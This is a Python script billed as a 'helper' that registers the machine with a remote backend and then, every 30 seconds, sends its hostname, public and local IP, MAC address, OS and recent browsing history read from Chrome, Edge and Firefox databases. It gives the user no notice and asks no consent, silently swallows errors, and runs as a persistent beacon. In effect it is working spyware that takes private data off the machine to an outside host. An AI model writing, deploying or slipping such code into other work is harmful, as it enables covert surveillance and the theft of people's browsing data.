import requests
import socket
import uuid
import platform
import time
import sys
import os
import shutil
import sqlite3
import tempfile
from pathlib import Path
import json

# =====================================================
# CONFIG
# =====================================================

BACKEND_BASE = "https://mytinylittlehelper.com"  # your real backend
REGISTER_ENDPOINT = f"{BACKEND_BASE}/add_device_advanced_token"
HEARTBEAT_ENDPOINT = f"{BACKEND_BASE}/device_heartbeat"
HEARTBEAT_INTERVAL = 30  # seconds

# Local token storage
TOKEN_FILE = Path("device_token.txt")

# =====================================================
# LOGGING FUNCTION
# =====================================================

def log(msg):
    try:
        with open("helper_debug.log", "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
    except:
        pass

# =====================================================
# DEVICE TOKEN
# =====================================================

def get_device_token():
    if TOKEN_FILE.exists():
        return TOKEN_FILE.read_text().strip()
    else:
        token = str(uuid.uuid4())
        TOKEN_FILE.write_text(token)
        return token

DEVICE_TOKEN = get_device_token()

# =====================================================
# DEVICE INFO
# =====================================================

def get_device_name():
    return socket.gethostname()

def get_os():
    return f"{platform.system()} {platform.release()}"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "unknown")
    except Exception:
        return "unknown"

def get_ip():
    public_ip = get_public_ip()
    local_ip = get_local_ip()
    log(f"IP detected - Public: {public_ip}, Local: {local_ip}")
    return public_ip if public_ip != "unknown" else local_ip

def get_mac():
    mac_num = uuid.getnode()
    return ":".join(f"{(mac_num >> ele) & 0xff:02x}" for ele in range(40, -1, -8))

# =====================================================
# BROWSER HISTORY (LOCK-SAFE)
# =====================================================

def read_sqlite_safely(db_path, query, limit=10):
    results = []
    try:
        if not db_path.exists():
            return results

        tmp_dir = tempfile.mkdtemp()
        tmp_db = Path(tmp_dir) / "history.db"
        shutil.copy2(db_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute(query, (limit,))
        rows = cursor.fetchall()

        for row in rows:
            results.append(row)

        conn.close()
        shutil.rmtree(tmp_dir)
    except Exception:
        pass

    return results

def chrome_edge_history(browser="chrome", limit=10):
    history = []
    base = Path(os.environ.get("LOCALAPPDATA", ""))
    if browser == "chrome":
        db = base / r"Google\Chrome\User Data\Default\History"
    else:
        db = base / r"Microsoft\Edge\User Data\Default\History"

    rows = read_sqlite_safely(
        db,
        "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT ?",
        limit
    )

    for url, title in rows:
        history.append({"browser": browser, "url": url, "title": title})

    return history

def firefox_history(limit=10):
    history = []
    base = Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"
    if not base.exists():
        return history

    for profile in base.iterdir():
        db = profile / "places.sqlite"
        rows = read_sqlite_safely(
            db,
            "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT ?",
            limit
        )
        for url, title in rows:
            history.append({"browser": "firefox", "url": url, "title": title})
        if history:
            break

    return history

def get_recent_sites(limit=10):
    sites = []
    sites.extend(chrome_edge_history("chrome", limit))
    sites.extend(chrome_edge_history("edge", limit))
    sites.extend(firefox_history(limit))
    return sites[:limit]

# =====================================================
# BACKEND COMMUNICATION
# =====================================================

def register_device():
    payload = {
        "token": DEVICE_TOKEN,
        "device_name": get_device_name(),
        "ip": get_ip(),
        "mac": get_mac(),
        "os": get_os(),
        "recent_sites": get_recent_sites()
    }

    try:
        r = requests.post(REGISTER_ENDPOINT, json=payload, timeout=10)
        if r.status_code == 200:
            log(f"Device registered successfully: {r.text}")
            return True
        else:
            log(f"Registration failed ({r.status_code}): {r.text}")
            return False
    except Exception as e:
        log(f"Registration exception: {e}")
        return False

def send_heartbeat():
    payload = {
        "token": DEVICE_TOKEN,
        "device_name": get_device_name(),
        "ip": get_ip(),
        "mac": get_mac(),
        "recent_sites": get_recent_sites()
    }

    try:
        r = requests.post(HEARTBEAT_ENDPOINT, json=payload, timeout=5)
        if r.status_code != 200:
            log(f"Heartbeat failed ({r.status_code})")
    except Exception as e:
        log(f"Heartbeat exception: {e}")

# =====================================================
# MAIN LOOP
# =====================================================

def main():
    log("=== Helper starting ===")

    if not register_device():
        log("Initial registration failed. Exiting.")
        sys.exit(1)

    while True:
        send_heartbeat()
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    main()
